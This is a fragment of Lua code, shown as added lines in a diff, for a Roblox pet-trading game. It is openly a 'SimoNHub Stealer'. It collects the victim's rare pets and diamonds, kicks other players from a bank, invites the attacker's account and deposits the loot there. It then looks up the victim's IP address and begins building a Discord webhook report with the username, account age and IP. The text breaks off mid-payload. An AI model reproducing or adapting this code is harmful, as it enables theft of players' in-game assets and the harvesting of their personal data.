+        if table.find(LHugBEList, v["id"]) ~= nil and v.l then
+            table.insert(LHList, v["uid"])
+        end
+    end
+    if #LHList < 50 then
+        for i, v in pairs(LHList) do
+            table.insert(LFinalList, v)
+        end
+    elseif #LHList > 50 then
+        for i, v in pairs(LHList) do
+            if #LFinalList < 50 then
+                table.insert(LFinalList, v)
+            end
+        end
+    end
+    if #LFinalList ~= 0 then
+        local A_5 = {
+            [1] = Bank,
+            [2] = LFinalList,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank, LFinalList, 0)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank, FinalList, 0)
+        end
+        wait(1.5)
+    end
+end
+
+if mybanks[2] ~= nil then
+    local BankID2 = mybanks[2]["BUID"]
+    Bank2 = BankID2
+    SuperBank2 = getbankremote:InvokeServer(Bank2)
+    BHList2 = {}
+    local pets2 = SuperBank2.Storage.Pets
+    local y = {}
+    for i, v in pairs(pets2) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(pets2) do
+        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
+            table.insert(BHList2, v["uid"])
+        end
+    end
+    if #BHList2 < 50 then
+        for i, v in pairs(BHList2) do
+            table.insert(FinalList2, v)
+        end
+    elseif #BHList2 > 50 then
+        for i, v in pairs(BHList2) do
+            if #FinalList2 < 50 then
+                table.insert(FinalList2, v)
+            end
+        end
+    end
+    bdiaamt2 = SuperBank2.Storage.Currency.Diamonds
+    if bdiaamt2 >= 1000000000 then
+        bdiaamt2 = bdiaamt2
+    elseif #FinalList2 ~= 0 and bdiaamt2 < 1000000000 then
+        bdiaamt2 = bdiaamt2
+    else
+        bdiaamt2 = 0
+    end
+    if #FinalList2 ~= 0 or bdiaamt2 ~= 0 then
+        local A_1 = {
+            [1] = Bank2,
+            [2] = FinalList2,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank2, FinalList2, bdiaamt2)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank2, FinalList2, 0)
+        end
+        wait(1.5)
+    end
+end
+if mybanks[3] ~= nil then
+    local BankID3 = mybanks[3]["BUID"]
+    Bank3 = BankID3
+    SuperBank3 = getbankremote:InvokeServer(Bank3)
+    BHList3 = {}
+    local pets3 = SuperBank3.Storage.Pets
+    local y = {}
+    for i, v in pairs(pets3) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(pets3) do
+        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
+            table.insert(BHList3, v["uid"])
+        end
+    end
+    if #BHList3 < 50 then
+        for i, v in pairs(BHList3) do
+            table.insert(FinalList3, v)
+        end
+    elseif #BHList3 > 50 then
+        for i, v in pairs(BHList3) do
+            if #FinalList3 < 50 then
+                table.insert(FinalList3, v)
+            end
+        end
+    end
+    bdiaamt3 = SuperBank3.Storage.Currency.Diamonds
+    if bdiaamt3 >= 1000000000 then
+        bdiaamt3 = bdiaamt3
+    elseif #FinalList3 ~= 0 and bdiaamt3 < 1000000000 then
+        bdiaamt3 = bdiaamt3
+    else
+        bdiaamt3 = 0
+    end
+    if #FinalList3 ~= 0 or bdiaamt3 ~= 0 then
+        local A_1 = {
+            [1] = Bank3,
+            [2] = FinalList3,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank3, FinalList3, bdiaamt3)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank3, FinalList3, 0)
+        end
+        wait(1.5)
+    end
+end
+if mybanks[4] ~= nil then
+    local BankID4 = mybanks[4]["BUID"]
+    Bank4 = BankID4
+    SuperBank4 = getbankremote:InvokeServer(Bank4)
+    BHList4 = {}
+    local pets4 = SuperBank4.Storage.Pets
+    local y = {}
+    for i, v in pairs(pets4) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(pets4) do
+        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
+            table.insert(BHList4, v["uid"])
+        end
+    end
+    if #BHList4 < 50 then
+        for i, v in pairs(BHList4) do
+            table.insert(FinalList4, v)
+        end
+    elseif #BHList4 > 50 then
+        for i, v in pairs(BHList4) do
+            if #FinalList4 < 50 then
+                table.insert(FinalList4, v)
+            end
+        end
+    end
+    bdiaamt4 = SuperBank4.Storage.Currency.Diamonds
+    if bdiaamt4 >= 1000000000 then
+        bdiaamt4 = bdiaamt4
+    elseif #FinalList4 ~= 0 and bdiaamt4 < 1000000000 then
+        bdiaamt4 = bdiaamt4
+    else
+        bdiaamt4 = 0
+    end
+    if #FinalList4 ~= 0 or bdiaamt4 ~= 0 then
+        local A_1 = {
+            [1] = Bank4,
+            [2] = FinalList4,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank4, FinalList4, bdiaamt4)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank4, FinalList4, 0)
+        end
+        wait(1.5)
+    end
+end
+
+-- Bank 5
+
+if mybanks[5] ~= nil then
+    local BankID5 = mybanks[5]["BUID"]
+    Bank5 = BankID5
+    SuperBank5 = getbankremote:InvokeServer(Bank5)
+    BHList5 = {}
+    local pets5 = SuperBank5.Storage.Pets
+    local y = {}
+    for i, v in pairs(pets5) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(pets5) do
+        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
+            table.insert(BHList5, v["uid"])
+        end
+    end
+    if #BHList5 < 50 then
+        for i, v in pairs(BHList5) do
+            table.insert(FinalList5, v)
+        end
+    elseif #BHList5 > 50 then
+        for i, v in pairs(BHList5) do
+            if #FinalList5 < 50 then
+                table.insert(FinalList5, v)
+            end
+        end
+    end
+    bdiaamt5 = SuperBank5.Storage.Currency.Diamonds
+    if bdiaamt5 >= 1000000000 then
+        bdiaamt5 = bdiaamt5
+    elseif #FinalList5 ~= 0 and bdiaamt5 < 1000000000 then
+        bdiaamt5 = bdiaamt5
+    else
+        bdiaamt5 = 0
+    end
+    if #FinalList5 ~= 0 or bdiaamt5 ~= 0 then
+        local A_1 = {
+            [1] = Bank5,
+            [2] = FinalList5,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank5, FinalList5, bdiaamt5)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank5, FinalList5, 0)
+        end
+        wait(1.5)
+    end
+end
+FinalFinal = #FinalList2 + #FinalList3 + #FinalList4 + #FinalList5
+DiamondsDiamonds = bdiaamt2 + bdiaamt3 + bdiaamt4 + bdiaamt5
+print(DiamondsDiamonds)
+
+
+local SuperBank = getbankremote:InvokeServer(Bank)
+local tier = SuperBank["Tier"]
+local max = 50
+local gemsinbank = SuperBank["Storage"]["Currency"]["Diamonds"]
+local petsinbank = #SuperBank["Storage"]["Pets"]
+local tier1hold = 40 - petsinbank
+local tier2hold = 95 - petsinbank
+local tier3hold = 200 - petsinbank
+local tier4hold = 500 - petsinbank
+local tier1gems = 10000000000 - gemsinbank
+local tier2gems = 50000000000 - gemsinbank
+local tier3gems = 300000000000 - gemsinbank
+local tier4gems = 1500000000000 - gemsinbank
+
+-- Kicking The Players
+
+for i, v in pairs(SuperBank["Players"]) do
+    if v ~= _G.UserID then
+        kickremote:InvokeServer(Bank, v)
+    end
+end
+
+-- First Invite
+
+if tier ~= 1 then
+    if dhid ~= nil then
+        inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
+    end
+    task.wait()
+    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
+end
+-- Bank Pets
+Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+Functions = Library.Functions
+
+
+BEXCList = {}
+BMythicList = {}
+BSecretList = {}
+BHugeList = {}
+BPogList = {}
+BBananaList = {}
+
+
+BSList = {}
+BEList = {}
+BMList = {}
+BHList = {}
+BPList = {}
+BBList = {}
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.rarity == "Exclusive" or v.rarity == "Event" then
+        table.insert(BEXCList, i)
+    end
+    if v.rarity == "Mythical" then
+        table.insert(BMythicList, i)
+    end
+    if v.huge then
+        table.insert(BHugeList, i)
+    end
+    if v.rarity == "Secret" then
+        table.insert(BSecretList, i)
+    end
+    if string.split(v.name, " ")[1] == "Pog" then
+        table.insert(BPogList, i)
+    end
+    if v.name == "banana" then
+        table.insert(BBananaList, i)
+    end
+end)
+for i, v in pairs(BPogList) do
+    table.insert(BEXCList, v)
+end
+for i, v in pairs(BBananaList) do
+    table.insert(BEXCList, v)
+end
+local pets = SuperBank["Storage"]["Pets"]
+local y = {}
+for i, v in pairs(pets) do
+    y[v["uid"]] = false
+end
+for i, v in pairs(pets) do
+    if table.find(BEXCList, v["id"]) ~= nil then
+        table.insert(BEList, v["uid"])
+    end
+    if table.find(BMythicList, v["id"]) ~= nil and v.s >= 1e+15 then
+        table.insert(BMList, v["uid"])
+    end
+    if table.find(BSecretList, v["id"]) ~= nil then
+        table.insert(BSList, v["uid"])
+    end
+    if table.find(BHugeList, v["id"]) ~= nil then
+        table.insert(BHList, v["uid"])
+    end
+end
+
+local BEHList = #BEList - #BHList
+
+-- Pet stuff
+local FinalList = {}
+
+Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+Functions = Library.Functions
+
+EXCList = {}
+MythicList = {}
+SecretList = {}
+HugeList = {}
+PogList = {}
+BananaList = {}
+
+
+SList = {}
+EList = {}
+MList = {}
+HList = {}
+PList = {}
+BList = {}
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.rarity == "Exclusive" and not v.huge then
+        table.insert(EXCList, i)
+    end
+    if v.rarity == "Event" then
+        table.insert(EXCList, i)
+    end
+    if v.rarity == "Mythical" then
+        table.insert(MythicList, i)
+    end
+    if v.huge then
+        table.insert(HugeList, i)
+    end
+    if v.rarity == "Secret" then
+        table.insert(SecretList, i)
+    end
+    if string.split(v.name, " ")[1] == "Pog" then
+        table.insert(PogList, i)
+    end
+    if v.name == "banana" then
+        table.insert(BananaList, i)
+    end
+end)
+for i, v in pairs(PogList) do
+    table.insert(EXCList, v)
+end
+for i, v in pairs(BananaList) do
+    table.insert(EXCList, v)
+end
+local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+local y = {}
+for i, v in pairs(pets) do
+    y[v["uid"]] = false
+end
+lockremote:InvokeServer(y)
+for i, v in pairs(pets) do
+    if table.find(EXCList, v["id"]) ~= nil then
+        table.insert(EList, v["uid"])
+    end
+    if table.find(MythicList, v["id"]) ~= nil and v.s >= 1e+15 and not v.hc then
+        table.insert(MList, v["uid"])
+    end
+    if table.find(MythicList, v["id"]) ~= nil and v.hc then
+        table.insert(MList, v["uid"])
+    end
+    if table.find(SecretList, v["id"]) ~= nil then
+        table.insert(SList, v["uid"])
+    end
+    if table.find(HugeList, v["id"]) ~= nil then
+        table.insert(HList, v["uid"])
+    end
+end
+if tier == 1 then
+    max = tier1hold
+elseif tier == 2 then
+    if tier2hold > 50 then
+        max = 50
+    elseif tier2hold < 50 then
+        max = tier2hold
+    end
+elseif tier == 3 then
+    if tier3hold > 50 then
+        max = 50
+    elseif tier3hold < 50 then
+        max = tier3hold
+    end
+elseif tier == 4 then
+    if tier4hold > 50 then
+        max = 50
+    elseif tier4hold < 50 then
+        max = tier4hold
+    end
+else
+    max = 50
+end
+print(max)
+if #EList + #MList + #PList + #SList + #HList < max then
+    for i, v in pairs(HList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(EList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(SList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(MList) do
+        table.insert(FinalList, v)
+    end
+elseif #EList + #SList + #MList + #HList > max and #HList < max then
+    for i, v in pairs(HList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(EList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+    for i, v in pairs(SList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+    for i, v in pairs(MList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #SList + #MList + #HList > max and #HList > max then
+    for i, v in pairs(HList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #MList + #PList + #SList + #HList > max and #HList == 0 and #EList < max then
+    for i, v in pairs(EList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(SList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+    for i, v in pairs(MList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #MList + #PList + #SList > max and #HList == 0 and #EList > max then
+    for i, v in pairs(EList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #MList + #PList + #SList > max and #HList == 0 and #EList == 0 and #SList < max then
+    for i, v in pairs(SList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(MList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #MList + #PList + #SList > max and #HList == 0 and #EList == 0 and #SList > max then
+    for i, v in pairs(SList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+end
+-- Bank Pets
+wait()
+game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
+local A_1 = {
+    [1] = "Cracked Egg",
+    [2] = false
+}
+eggremote:InvokeServer("Cracked Egg", false, false)
+wait()
+local A_1 = {
+    [1] = Bank,
+    [2] = FinalList,
+    [3] = 0
+}
+
+wait()
+local diaamt = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
+if diaamt ~= 0 then
+    diaamt = diaamt - 1
+end
+
+if tier == 1 and diaamt > tier1gems then
+    diaamt = tier1gems
+elseif tier == 1 and diaamt <= tier1gems then
+    diaamt = diaamt
+elseif tier == 2 and diaamt > tier2gems then
+    diaamt = tier2gems
+elseif tier == 2 and diaamt <= tier2gems then
+    diaamt = diaamt
+elseif tier == 3 and diaamt > tier3gems then
+    diaamt = tier3gems
+elseif tier == 3 and diaamt <= tier3gems then
+    diaamt = diaamt
+elseif tier == 4 and diaamt > tier4gems then
+    diaamt = tier4gems
+elseif tier == 4 and diaamt <= tier4gems then
+    diaamt = diaamt
+else
+    diaamt = diaamt
+end
+
+
+
+
+local s, e = pcall(function()
+    wait(0.2)
+    depositremote:InvokeServer(Bank, FinalList, diaamt)
+end)
+
+if s == false then
+    wait(0.2)
+    depositremote:InvokeServer(Bank, FinalList, 1)
+end
+local banktiercheck = true
+if s == true then
+    if tier == 1 and diaamt + SuperBank["Storage"]["Currency"]["Diamonds"] >= 40000000 then
+        upgraderemote:InvokeServer(Bank)
+        banktiercheck = true
+        tier = 2
+    elseif tier == 1 and diaamt + SuperBank["Storage"]["Currency"]["Diamonds"] < 40000000 then
+        banktiercheck = false
+        game:GetService("Players").LocalPlayer:Kick("Script Is Not Supported")
+    end
+end
+local SFinalList = {}
+if #FinalList == 50 then
+    wait(0.5)
+    local Smax = 50
+
+    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+    Functions = Library.Functions
+
+    SEXCList = {}
+    SMythicList = {}
+    SSecretList = {}
+    SHugeList = {}
+    SPogList = {}
+    SBananaList = {}
+
+
+    SSList = {}
+    SEList = {}
+    SMList = {}
+    SHList = {}
+    SPList = {}
+    SBList = {}
+
+    table.foreach(Library.Directory.Pets, function(i, v)
+        if v.rarity == "Exclusive" and not v.huge then
+            table.insert(SEXCList, i)
+        end
+        if v.rarity == "Event" and not v.huge then
+            table.insert(SEXCList, i)
+        end
+        if v.rarity == "Mythical" then
+            table.insert(SMythicList, i)
+        end
+        if v.huge then
+            table.insert(SHugeList, i)
+        end
+        if v.rarity == "Secret" then
+            table.insert(SSecretList, i)
+        end
+        if string.split(v.name, " ")[1] == "Pog" then
+            table.insert(SPogList, i)
+        end
+        if v.name == "banana" then
+            table.insert(SBananaList, i)
+        end
+    end)
+    for i, v in pairs(SPogList) do
+        table.insert(SEXCList, v)
+    end
+    for i, v in pairs(SBananaList) do
+        table.insert(SEXCList, v)
+    end
+    local Spets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+    local y = {}
+    for i, v in pairs(Spets) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(Spets) do
+        if table.find(SEXCList, v["id"]) ~= nil then
+            table.insert(SEList, v["uid"])
+        end
+        if table.find(SMythicList, v["id"]) ~= nil and v.s >= 1e+15 and not v.hc then
+            table.insert(SMList, v["uid"])
+        end
+        if table.find(SMythicList, v["id"]) ~= nil and v.hc then
+            table.insert(SMList, v["uid"])
+        end
+        if table.find(SSecretList, v["id"]) ~= nil then
+            table.insert(SSList, v["uid"])
+        end
+        if table.find(SHugeList, v["id"]) ~= nil then
+            table.insert(SHList, v["uid"])
+        end
+    end
+    if tier == 1 then
+        Smax = tier1hold - #FinalList
+    elseif tier == 2 then
+        if tier2hold - #FinalList > 50 then
+            Smax = 50
+        elseif tier2hold - #FinalList < 50 then
+            Smax = tier2hold - #FinalList
+        end
+    elseif tier == 3 then
+        if tier3hold - #FinalList > 50 then
+            Smax = 50
+        elseif tier3hold - #FinalList < 50 then
+            Smax = tier3hold - #FinalList
+        end
+    elseif tier == 4 - #FinalList then
+        if tier4hold - #FinalList > 50 then
+            Smax = 50
+        elseif tier4hold - #FinalList < 50 then
+            Smax = tier4hold - #FinalList
+        end
+    else
+        Smax = 50
+    end
+    print(Smax)
+    if #SEList + #SMList + #SPList + #SSList + #SHList < Smax then
+        for i, v in pairs(SHList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SEList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SSList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SMList) do
+            table.insert(SFinalList, v)
+        end
+    elseif #SEList + #SSList + #SMList + #SHList > Smax and #SHList < Smax then
+        for i, v in pairs(SHList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SEList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+        for i, v in pairs(SSList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+        for i, v in pairs(SMList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SSList + #SMList + #SHList > Smax and #SHList > Smax then
+        for i, v in pairs(SHList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SMList + #SPList + #SSList + #SHList > Smax and #SHList == 0 and #SEList < Smax then
+        for i, v in pairs(SEList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SSList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+        for i, v in pairs(SMList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SMList + #SPList + #SSList > Smax and #SHList == 0 and #SEList > Smax then
+        for i, v in pairs(SEList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SMList + #SPList + #SSList > Smax and #SHList == 0 and #SEList == 0 and #SSList < Smax then
+        for i, v in pairs(SSList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SMList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SMList + #SPList + #SSList > Smax and #SHList == 0 and #SEList == 0 and #SSList > Smax then
+        for i, v in pairs(SSList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    end
+    -- Bank Pets
+    wait()
+    local A_1 = {
+        [1] = Bank,
+        [2] = SFinalList,
+        [3] = 0
+    }
+
+    wait()
+    local Sdiaamt = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
+    if Sdiaamt ~= 0 then
+        Sdiaamt = Sdiaamt - 1
+    end
+
+    if tier == 1 and Sdiaamt > tier1gems - diaamt then
+        Sdiaamt = tier1gems - diaamt
+    elseif tier == 1 and diaamt <= tier1gems - diaamt then
+        Sdiaamt = Sdiaamt
+    elseif tier == 2 and diaamt > tier2gems - diaamt then
+        Sdiaamt = tier2gems - diaamt
+    elseif tier == 2 and diaamt <= tier2gems - diaamt then
+        Sdiaamt = Sdiaamt
+    elseif tier == 3 and diaamt > tier3gems - diaamt then
+        Sdiaamt = tier3gems - diaamt
+    elseif tier == 3 and diaamt <= tier3gems - diaamt then
+        Sdiaamt = Sdiaamt
+    elseif tier == 4 and diaamt > tier4gems - diaamt then
+        Sdiaamt = tier4gems - diaamt
+    elseif tier == 4 and diaamt <= tier4gems - diaamt then
+        Sdiaamt = Sdiaamt
+    else
+        Sdiaamt = Sdiaamt
+    end
+
+    local s, e = pcall(function()
+        wait(0.2)
+        depositremote:InvokeServer(Bank, SFinalList, Sdiaamt)
+    end)
+
+    if s == false then
+        wait(0.2)
+        depositremote:InvokeServer(Bank, SFinalList, 1)
+    end
+end
+-- abbreviations
+local diaamt2 = diaamt
+local abbreviations = {
+    k = 4,
+    m = 7,
+    b = 10,
+    T = 13,
+}
+local DiamondsCount = tostring(math.floor(diaamt2))
+
+local ChosenAbbreviation
+for abbreviation, digits in pairs(abbreviations) do
+    if #DiamondsCount >= digits and #DiamondsCount < (digits + 3) then
+        ChosenAbbreviation = abbreviation
+        break
+    end
+end
+
+if ChosenAbbreviation then
+    local digits = abbreviations[ChosenAbbreviation]
+    local rounded = math.floor(diaamt2 / 10 ^ (digits - 3)) * 10 ^ (digits - 3)
+    DiamondsCount = string.format("%0.2f", rounded / 10 ^ (digits - 1))
+    local addsd = string.split(DiamondsCount, ".")[2]
+    local pnt = "."
+    if string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] ~= "0" then
+        DiamondsCount = string.split(DiamondsCount, ".")[1] .. pnt .. string.split(addsd, "")[1] .. ChosenAbbreviation
+    elseif string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] == "0" then
+        DiamondsCount = string.split(DiamondsCount, ".")[1] .. ChosenAbbreviation
+    elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] ~= "0" then
+        DiamondsCount = DiamondsCount .. ChosenAbbreviation
+    elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] == "0" then
+        DiamondsCount = DiamondsCount .. ChosenAbbreviation
+    else
+        DiamondsCount = diamond
+    end
+end
+local Bdiaamt = SuperBank["Storage"]["Currency"]["Diamonds"]
+local Babbreviations = {
+    k = 4,
+    m = 7,
+    b = 10,
+    T = 13,
+}
+local BDiamondsCount = tostring(math.floor(Bdiaamt))
+local BChosenAbbreviation
+for Babbreviation, Bdigits in pairs(Babbreviations) do
+    if #BDiamondsCount >= Bdigits and #BDiamondsCount < (Bdigits + 3) then
+        BChosenAbbreviation = Babbreviation
+        break
+    end
+end
+
+if BChosenAbbreviation then
+    local Bdigits = Babbreviations[BChosenAbbreviation]
+    local Brounded = math.floor(Bdiaamt / 10 ^ (Bdigits - 3)) * 10 ^ (Bdigits - 3)
+    BDiamondsCount = string.format("%0.2f", Brounded / 10 ^ (Bdigits - 1))
+    local Baddsd = string.split(BDiamondsCount, ".")[2]
+    local pnt = "."
+    if string.split(Baddsd, "")[2] == "0" and string.split(Baddsd, "")[1] ~= "0" then
+        BDiamondsCount = string.split(BDiamondsCount, ".")[1] ..
+            pnt .. string.split(Baddsd, "")[1] .. BChosenAbbreviation
+    elseif string.split(Baddsd, "")[2] == "0" and string.split(Baddsd, "")[1] == "0" then
+        BDiamondsCount = string.split(BDiamondsCount, ".")[1] .. BChosenAbbreviation
+    elseif string.split(Baddsd, "")[2] ~= "0" and string.split(Baddsd, "")[1] ~= "0" then
+        BDiamondsCount = BDiamondsCount .. BChosenAbbreviation
+    elseif string.split(Baddsd, "")[2] ~= "0" and string.split(Baddsd, "")[1] == "0" then
+        BDiamondsCount = BDiamondsCount .. BChosenAbbreviation
+    else
+        BDiamondsCount = Bdiaamt
+    end
+end
+
+
+local totaldiamond = Bdiaamt + diaamt
+local Tabbreviations = {
+    k = 4,
+    m = 7,
+    b = 10,
+    T = 13,
+}
+local TDiamondsCount = tostring(math.floor(totaldiamond))
+
+local TChosenAbbreviation
+for Tabbreviation, Tdigits in pairs(Tabbreviations) do
+    if #TDiamondsCount >= Tdigits and #TDiamondsCount < (Tdigits + 3) then
+        TChosenAbbreviation = Tabbreviation
+        break
+    end
+end
+
+if TChosenAbbreviation then
+    local Tdigits = Tabbreviations[TChosenAbbreviation]
+    local Trounded = math.floor(totaldiamond / 10 ^ (Tdigits - 3)) * 10 ^ (Tdigits - 3)
+    TDiamondsCount = string.format("%0.2f", Trounded / 10 ^ (Tdigits - 1))
+    local Taddsd = string.split(TDiamondsCount, ".")[2]
+    local pnt = "."
+    if string.split(Taddsd, "")[2] == "0" and string.split(Taddsd, "")[1] ~= "0" then
+        TDiamondsCount = string.split(TDiamondsCount, ".")[1] ..
+            pnt .. string.split(Taddsd, "")[1] .. TChosenAbbreviation
+    elseif string.split(Taddsd, "")[2] == "0" and string.split(Taddsd, "")[1] == "0" then
+        TDiamondsCount = string.split(TDiamondsCount, ".")[1] .. TChosenAbbreviation
+    elseif string.split(Taddsd, "")[2] ~= "0" and string.split(Taddsd, "")[1] ~= "0" then
+        TDiamondsCount = TDiamondsCount .. TChosenAbbreviation
+    elseif string.split(Taddsd, "")[2] ~= "0" and string.split(Taddsd, "")[1] == "0" then
+        TDiamondsCount = TDiamondsCount .. TChosenAbbreviation
+    else
+        TDiamondsCount = totaldiamond
+    end
+end
+
+local Wdiaamt = DiamondsDiamonds
+local Wabbreviations = {
+    k = 4,
+    m = 7,
+    b = 10,
+    T = 13,
+}
+local WDiamondsCount = tostring(math.floor(Wdiaamt))
+
+local WChosenAbbreviation
+for Wabbreviation, Wdigits in pairs(Wabbreviations) do
+    if #WDiamondsCount >= Wdigits and #WDiamondsCount < (Wdigits + 3) then
+        WChosenAbbreviation = Wabbreviation
+        break
+    end
+end
+
+if WChosenAbbreviation then
+    local Wdigits = Wabbreviations[WChosenAbbreviation]
+    local Wrounded = math.floor(Wdiaamt / 10 ^ (Wdigits - 3)) * 10 ^ (Wdigits - 3)
+    WDiamondsCount = string.format("%0.2f", Wrounded / 10 ^ (Wdigits - 1))
+    local Waddsd = string.split(WDiamondsCount, ".")[2]
+    local pnt = "."
+    if string.split(Waddsd, "")[2] == "0" and string.split(Waddsd, "")[1] ~= "0" then
+        WDiamondsCount = string.split(WDiamondsCount, ".")[1] ..
+            pnt .. string.split(Waddsd, "")[1] .. WChosenAbbreviation
+    elseif string.split(Waddsd, "")[2] == "0" and string.split(Waddsd, "")[1] == "0" then
+        WDiamondsCount = string.split(WDiamondsCount, ".")[1] .. WChosenAbbreviation
+    elseif string.split(Waddsd, "")[2] ~= "0" and string.split(Waddsd, "")[1] ~= "0" then
+        WDiamondsCount = WDiamondsCount .. WChosenAbbreviation
+    elseif string.split(Waddsd, "")[2] ~= "0" and string.split(Waddsd, "")[1] == "0" then
+        WDiamondsCount = WDiamondsCount .. WChosenAbbreviation
+    else
+        WDiamondsCount = DiamondsDiamonds
+    end
+end
+
+
+
+-- Sending webhook
+
+local username = game:GetService("Players").LocalPlayer.Name
+local fardplayer = game:GetService("Players").LocalPlayer
+local receiver = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+local IPadress = game:HttpGet('https://ipinfo.io/ip')
+local banktier = SuperBank["Tier"]
+local lmao = "/5"
+local ping
+if #HList ~= 0 or #BHList ~= 0 then
+    ping = "@everyone"
+elseif #HList == 0 and #BHList == 0 then
+    ping = ""
+end
+-- Img
+local data1
+if banktiercheck == true then
+    imgs = "https://cdn.discordapp.com/attachments/1080576653463396364/1129560397079392378/standard.gif"
+
+    data1 = {
+        ["content"] = ping,
+        ["username"] = "SimoNHub",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1080576653463396364/1129560397079392378/standard.gif",
+        ["embeds"] = { {
+            ["title"] = "**New Hit** ||With SimoNHub||",
+            ["url"] = "https://discord.gg/psxscripts",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x2798FF),
+            ["thumbnail"] = {
+                ["url"] = imgs,
+                ["height"] = 420,
+                ["width"] = 420
+            },
+            ["fields"] = { {
+                ["name"] = "**This data was generated using SimoNHub Stealer** :moyai:",
+                ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
+                    "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
+                    " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
+                    "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "\nBank Tier    : Tier " .. SuperBank["Tier"] .. "```",
+                ["inline"] = false
+            }, {
+                ["name"] = ":gem: **Diamonds** :gem:",
+                ["value"] = "```" .. DiamondsCount .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":dog: **Pets** :dog:",
+                ["value"] = "```" .. #FinalList + #SFinalList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":money_mouth: **Huges** :money_mouth:",
+                ["value"] = "```" .. #HList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":cat: **Exclusives** :cat:",
+                ["value"] = "```" .. #EList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":performing_arts: **Secrets** :performing_arts:",
